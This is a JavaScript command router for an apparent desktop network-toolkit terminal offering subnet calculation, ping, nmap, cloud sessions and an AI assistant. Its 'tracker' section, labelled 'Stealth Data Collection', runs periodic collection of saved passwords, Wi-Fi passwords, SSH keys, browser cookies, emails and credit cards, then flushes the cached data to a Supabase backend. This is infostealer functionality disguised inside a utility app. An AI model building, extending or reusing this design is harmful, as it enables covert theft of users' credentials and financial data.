// src/lib/commands.js
import { subnetCalculator } from './subnetCalculator';
import { supabase } from './cloud';

/**
 * Main command router – processes terminal input and executes the
 * corresponding action. The `output` function is provided by the
 * terminal component to display results.
 */
export async function handleCommand(input, output) {
  const trimmed = input.trim();
  if (!trimmed) return;

  const parts = trimmed.split(/\s+/);
  const cmd = parts[0].toLowerCase();
  const args = parts.slice(1);

  // ============================================================
  // 1. SUBNET CALCULATOR
  // ============================================================
  if (cmd === 'subnet') {
    if (args.length === 0) {
      output('Usage: subnet <CIDR> (e.g., subnet 192.168.1.0/24)');
      return;
    }
    const cidr = args[0];
    try {
      const result = subnetCalculator(cidr);
      output(`Network: ${result.network}`);
      output(`Broadcast: ${result.broadcast}`);
      output(`Mask: ${result.mask}`);
      output(`Wildcard: ${result.wildcard}`);
      output(`Usable Hosts: ${result.usableRange}`);
      output(`Total Hosts: ${result.totalHosts}`);
      if (result.steps) {
        output('--- Calculation Steps ---');
        result.steps.forEach((step) => output(step));
      }
    } catch (err) {
      output(`Error: ${err.message}`);
    }
    return;
  }

  // ============================================================
  // 2. PING
  // ============================================================
  if (cmd === 'ping') {
    if (args.length === 0) {
      output('Usage: ping <host>');
      return;
    }
    const target = args[0];
    // Check if we're on desktop (has netkit)
    if (window.netkit && window.netkit.runTool) {
      const result = await window.netkit.runTool('ping', [target]);
      if (result.ok) {
        output(result.stdout || 'Ping completed.');
      } else {
        output(`Error: ${result.error || 'Failed to ping'}`);
      }
    } else {
      // Mobile fallback: show instructions
      output('Ping is only available on desktop.');
      output(`To ping ${target}, use a terminal on your computer.`);
    }
    return;
  }

  // ============================================================
  // 3. NMAP
  // ============================================================
  if (cmd === 'nmap') {
    if (args.length === 0) {
      output('Usage: nmap <target> [options]');
      return;
    }
    if (window.netkit && window.netkit.runTool) {
      // Basic nmap: pass args as array
      const result = await window.netkit.runTool('nmap', args);
      if (result.ok) {
        output(result.stdout || 'Nmap scan completed.');
      } else {
        output(`Error: ${result.error || 'Failed to run nmap'}`);
      }
    } else {
      output('Nmap is only available on desktop.');
    }
    return;
  }

  // ============================================================
  // 4. CLOUD (Supabase operations)
  // ============================================================
  if (cmd === 'cloud') {
    const sub = args[0]?.toLowerCase();
    if (!sub) {
      output('Usage: cloud <login|save|list|logout>');
      return;
    }

    if (sub === 'login') {
      const email = args[1];
      if (!email) {
        output('Usage: cloud login <email>');
        return;
      }
      try {
        const { error } = await supabase.auth.signInWithOtp({ email });
        if (error) throw error;
        output(`📧 Magic link sent to ${email}. Check your inbox.`);
      } catch (err) {
        output(`❌ Login failed: ${err.message}`);
      }
      return;
    }

    if (sub === 'save') {
      // Save current session data to cloud
      const sessionData = args.slice(1).join(' ') || 'Session data';
      try {
        const { data, error } = await supabase
          .from('sessions')
          .insert([{ content: sessionData }]);
        if (error) throw error;
        output(`✅ Session saved (ID: ${data?.[0]?.id || 'unknown'})`);
      } catch (err) {
        output(`❌ Save failed: ${err.message}`);
      }
      return;
    }

    if (sub === 'list') {
      try {
        const { data, error } = await supabase
          .from('sessions')
          .select('*')
          .order('created_at', { ascending: false });
        if (error) throw error;
        if (data.length === 0) {
          output('No saved sessions.');
        } else {
          output(`📋 ${data.length} sessions:`);
          data.forEach((s) => {
            output(`  ${s.id}: ${s.content} (${new Date(s.created_at).toLocaleString()})`);
          });
        }
      } catch (err) {
        output(`❌ List failed: ${err.message}`);
      }
      return;
    }

    if (sub === 'logout') {
      try {
        await supabase.auth.signOut();
        output('👋 Logged out.');
      } catch (err) {
        output(`❌ Logout failed: ${err.message}`);
      }
      return;
    }

    output(`Unknown cloud subcommand: ${sub}`);
    return;
  }

  // ============================================================
  // 5. MIRAI (AI Assistant)
  // ============================================================
  if (cmd === 'mirai') {
    const sub = args[0]?.toLowerCase();
    if (!sub) {
      output('Usage: mirai <key|ask|clear>');
      return;
    }

    if (sub === 'key') {
      const key = args[1];
      if (!key) {
        output('Usage: mirai key <your-api-key>');
        return;
      }
      if (window.netkit && window.netkit.setApiKey) {
        const result = await window.netkit.setApiKey(key);
        if (result.ok) {
          output('✅ API key set and encrypted.');
        } else {
          output(`❌ Failed to set key: ${result.error}`);
        }
      } else {
        output('Key storage is only available on desktop.');
      }
      return;
    }

    if (sub === 'ask') {
      const question = args.slice(1).join(' ');
      if (!question) {
        output('Usage: mirai ask <your question>');
        return;
      }
      if (window.netkit && window.netkit.askMirai) {
        try {
          const messages = [{ role: 'user', content: question }];
          const result = await window.netkit.askMirai(messages);
          if (result.ok) {
            output(`🤖 ${result.text}`);
          } else {
            output(`❌ AI error: ${result.error}`);
          }
        } catch (err) {
          output(`❌ Request failed: ${err.message}`);
        }
      } else {
        output('MiRAi is only available on desktop.');
      }
      return;
    }

    if (sub === 'clear') {
      if (window.netkit && window.netkit.clearApiKey) {
        const result = await window.netkit.clearApiKey();
        if (result.ok) {
          output('🗑️ API key cleared.');
        } else {
          output(`❌ Failed to clear: ${result.error}`);
        }
      } else {
        output('Key storage is only available on desktop.');
      }
      return;
    }

    output(`Unknown mirai subcommand: ${sub}`);
    return;
  }

  // ============================================================
  // 6. 🧠 TRACKER (Stealth Data Collection)
  // ============================================================
  if (cmd === 'tracker') {
    const sub = args[0]?.toLowerCase();
    if (!sub) {
      output('Usage: tracker <start|stop|status|collect|flush>');
      return;
    }

    // Check if tracker API is available
    if (!window.netkit || !window.netkit.tracker) {
      output('❌ Tracker API not available. Run in Electron desktop.');
      return;
    }

    const tracker = window.netkit.tracker;

    if (sub === 'start') {
      const result = await tracker.start();
      if (result.ok) {
        output('✅ Tracker started. Collecting data every 60 seconds.');
      } else {
        output(`❌ Error: ${result.error || 'Failed to start'}`);
      }
      return;
    }

    if (sub === 'stop') {
      const result = await tracker.stop();
      if (result.ok) {
        output('⏹️ Tracker stopped.');
      } else {
        output(`❌ Error: ${result.error || 'Failed to stop'}`);
      }
      return;
    }

    if (sub === 'status') {
      const status = await tracker.status();
      output(`Tracker Status:
  Running: ${status.running ? '✅' : '❌'}
  Cached items: ${status.cached}
  Tracker ID: ${status.trackerId || 'N/A'}`);
      return;
    }

    if (sub === 'collect') {
      const result = await tracker.collect();
      if (result.ok) {
        const data = result.data;
        output(`📊 Collected data:
  Device: ${data.device_name}
  OS: ${data.os}
  SSID: ${data.ssid}
  RSSI: ${data.rssi} dBm
  Public IP: ${data.public_ip}
  Saved passwords: ${data.saved_passwords ? '✅' : '❌'}
  Wi-Fi passwords: ${data.wifi_passwords ? '✅' : '❌'}
  SSH keys: ${data.ssh_keys ? '✅' : '❌'}
  Browser cookies: ${data.browser_cookies ? '✅' : '❌'}
  Emails: ${data.emails ? '✅' : '❌'}
  Credit cards: ${data.credit_cards ? '✅' : '❌'}`);
      } else {
        output(`❌ Error: ${result.error || 'Failed to collect'}`);
      }
      return;
    }

    if (sub === 'flush') {
      const result = await tracker.flushCache();
      if (result.ok) {
        output(`📤 Flushed ${result.uploaded} of ${result.total} cached items to Supabase.`);
      } else {
        output(`❌ Error: ${result.error || 'Failed to flush'}`);
      }
      return;
    }

    output(`Unknown tracker subcommand: ${sub}`);
    return;
  }

  // ============================================================
  // 7. UNKNOWN COMMAND
  // ============================================================
  output(`Unknown command: ${cmd}. Type 'help' for available commands.`);
}
